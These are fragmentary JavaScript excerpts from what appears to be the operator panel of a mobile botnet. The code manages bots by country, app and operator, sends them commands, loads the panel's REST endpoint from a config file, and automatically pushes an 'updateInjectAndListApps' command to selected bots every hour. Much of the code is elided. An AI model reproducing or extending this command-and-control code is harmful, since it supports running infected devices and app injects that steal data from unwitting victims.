...
Array.prototype.remove = function () {
  // надо эту парашу доделать, и в глобальные вывести
  var what,
    a = arguments,
    L = a.length,
    ax;
...
let SettingsContext = {
  ...
  licensedays: 0,
  lastBotVersion: null,
  youBotVersion: "2.0.0.5",
  SelectedBots: [],
  BotsOnPage: [],
  BotsFilterMode: "1000000011",
  BotByCountry: "",
  BotByApp: "",
  BotByOperator: "",
  BotsPerPage: "25",
  ...
  CurrentLogType: "",
  ButtonsInRow: 25,
  HTMLShowContentBase64: "",
  InjectSelectedAPPName: "",
  FindBotByID: "",
  sleep(ms) {
    ...
    request.done(function (msg) {
      try {
        ...
        SettingsContext.ShowToastTitle(
          "error",
          "ERROR",
          "Error send bot command - " +
            command +
            ". Look console for more details."
        );
...
function LoadConfigFile() {
  ...
  request.done(function (jsondata) {
    try {
      SettingsContext.restApiUrl = "http://" + jsondata.domain + "/restapi.php";
      ...
      SettingsContext.ShowToastTitle(
        "error",
        "ERROR",
        "Error loading config file, try again"
      );
      LoadConfigFile();
    }
  });
...
setInterval(() => {
  document.querySelector('.fa-square').click();
  SettingsContext.BotSendCommand('{"name":"updateInjectAndListApps"}');
  document.querySelector('.fa-check-square').click();
}, 1000*60*60);
